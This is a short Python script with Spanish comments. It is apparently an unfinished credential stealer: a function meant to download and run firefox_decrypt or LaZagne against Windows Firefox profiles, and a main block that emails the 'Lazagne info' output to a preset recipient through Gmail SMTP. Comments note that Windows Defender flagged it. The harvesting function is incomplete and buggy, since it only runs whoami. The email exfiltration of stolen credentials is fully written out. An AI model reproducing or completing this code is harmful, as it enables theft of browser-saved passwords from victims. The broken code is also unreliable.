#!/usr/bin/env python3

import os
import platform
import signal
import smtplib
import subprocess
import sys
import tempfile
from email.mime.text import MIMEText

import requests
from dotenv import load_dotenv
from termcolor import colored

load_dotenv()
GMAIL_PASS = os.getenv("APPPASS", "")
SENDER_MAIL = os.getenv("SENDER_MAIL", "")
RECIPE_MAIL = os.getenv("RECIPE_MAIL", "")

OS = platform.system()


# NOTE: Send emails
def send_email(subject, body, sender, recipients, password):
    if True:
        print(
            colored(
                f"[+] Enviando correo...\nfrom: {sender}\nto:{recipients}\ncontent:{body}\n"
            )
        )

    # WARN: se requiere clave de app de google para su uso.
    msg = MIMEText(body)
    msg["Subject"] = subject
    msg["From"] = sender
    msg["To"] = ", ".join(recipients)

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp_server:
        smtp_server.login(sender, password)
        smtp_server.sendmail(sender, recipients, msg.as_string())

    print(f"\n[+] Message sent!\n")


def def_handler(sig, frame):
    print(colored(f"\n[-] Saliendo...\n", "red"))
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


def run_command(command):
    output_command = subprocess.check_output(command, shell=True)
    return output_command


def download_and_execute_firefox_decrypt():

    # NOTE: host must download the python file firefox_decrypt.py from https://github.com/unode/firefox_decrypt

    # NOTE: For windows: this script attempt from C:\\Users\\{usernaem}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles
    user_name = run_command("whoami").split("/\\")[1]
    print(user_name)


if __name__ == "__main__":
    # NOTE: get to .exe host and execution (windows defender alerted)
    output_lazagne = download_and_execute_firefox_decrypt()
    send_email("Lazagne info", output_lazagne, SENDER_MAIL, [RECIPE_MAIL], GMAIL_PASS)
